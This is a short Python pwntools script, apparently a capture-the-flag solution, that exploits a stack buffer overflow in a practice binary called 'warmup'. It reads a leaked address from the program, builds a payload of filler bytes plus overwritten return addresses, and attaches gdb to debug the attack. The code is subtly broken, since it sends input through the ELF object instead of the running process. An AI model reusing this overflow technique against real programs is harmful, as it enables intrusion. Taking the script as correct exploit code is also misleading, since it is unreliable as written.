#!/usr/bin/env python3
import argparse
import pwn
#elf = gdb.debug(binary.path, gdbscript='b *main + 129')

elf = pwn.ELF("./warmup")
p = elf.process()
buf = p.readuntil(">")
easy_addr = int(buf.split(b"WOW:")[1][:-1], 0)
payload =  b""
payload += b"D" *70
payload +=b"A"*2
payload += pwn.p64(easy_addr+15) #OR payload += p64(0x40061c) JUST HAS TO BE ANY return addr

payload += pwn.p64(easy_addr)

with open("payload", "wb") as fp:
    fp.write(payload)

g = pwn.gdb.attach(
    p,
    gdbscript="""
    b *main+124
    b *main+134
    break *main+135
    r < payload
    """,
    )
easy_addr = "{0:x}".format(easy_addr)
print(easy_addr)
elf.sendline(payload)
elf.interactive()
  
